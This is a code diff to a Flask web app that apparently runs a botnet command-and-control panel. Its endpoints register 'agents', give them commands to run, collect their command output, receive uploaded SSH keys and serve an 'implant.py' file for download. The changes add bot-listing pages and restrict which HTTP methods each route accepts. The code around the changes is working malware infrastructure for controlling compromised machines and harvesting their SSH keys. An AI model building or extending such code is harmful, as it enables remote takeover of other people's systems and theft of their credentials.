@@ -43,7 +43,21 @@ def add_agent(agent_dict):
         return agent.id
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/bots', methods=['GET'])
+@login_required
+def bots():
+   return render_template("bots.html") 
+
+
+@app.route('/bot<id>', methods=['GET'])
+@login_required
+def bot(id):
+    agent = Agent.query.filter_by(id=id).first()
+    print(agent)
+    return render_template("bot.html", agent=agent)
+
+
+@app.route('/', methods=['GET'])
 @login_required
 def home():  # put application's code here
     output = ""
@@ -61,7 +75,7 @@ def home():  # put application's code here
     return render_template('index.html', agents=agents, command_out=output)
 
 
-@app.route('/api/1.1/add_agent', methods=['GET', 'POST'])
+@app.route('/api/1.1/add_agent', methods=['POST'])
 def agent_add():
     print(request.method)
     if request.method == 'POST':
@@ -70,7 +84,7 @@ def agent_add():
         return str(id)
 
 
-@app.route('/api/1.1/get_command', methods=['GET', 'POST'])
+@app.route('/api/1.1/get_command', methods=['POST'])
 def get_command():
     print(request.method)
     if request.method == 'POST':
@@ -79,7 +93,7 @@ def get_command():
         return res.command
 
 
-@app.route('/api/1.1/command_out', methods=['GET', 'POST'])
+@app.route('/api/1.1/command_out', methods=['POST'])
 def command_out():
     print(request.method)
     if request.method == 'POST':
@@ -94,7 +108,7 @@ def command_out():
         return 'Received'
 
 
-@app.route('/api/1.1/ssh_keys', methods=['GET', 'POST'])
+@app.route('/api/1.1/ssh_keys', methods=['POST'])
 def ssh_keys():
     if request.method == 'POST':
         key_dict = request.json['keys']
@@ -105,7 +119,7 @@ def ssh_keys():
         return 'Received BINGUS MODE'
 
 
-@app.route('/api/1.1/retrieve_scripts', methods=['GET', 'POST'])
+@app.route('/api/1.1/retrieve_scripts', methods=['GET'])
 def scripts():
     try:
         return send_from_directory('implant', path='implant.py', filename='implant.py', as_attachment=True)
@@ -113,7 +127,7 @@ def scripts():
         abort(404)
 
 
-@app.route('/welcome')
+@app.route('/welcome', methods=['GET'])
 def welcome():
     return render_template("welcome.html")
 
@@ -131,7 +145,7 @@ def login():
     return render_template('login.html', error=error)
 
 
-@app.route('/logout')
+@app.route('/logout', methods=['GET'])
 @login_required
 def logout():
     session.pop('logged_in', None)
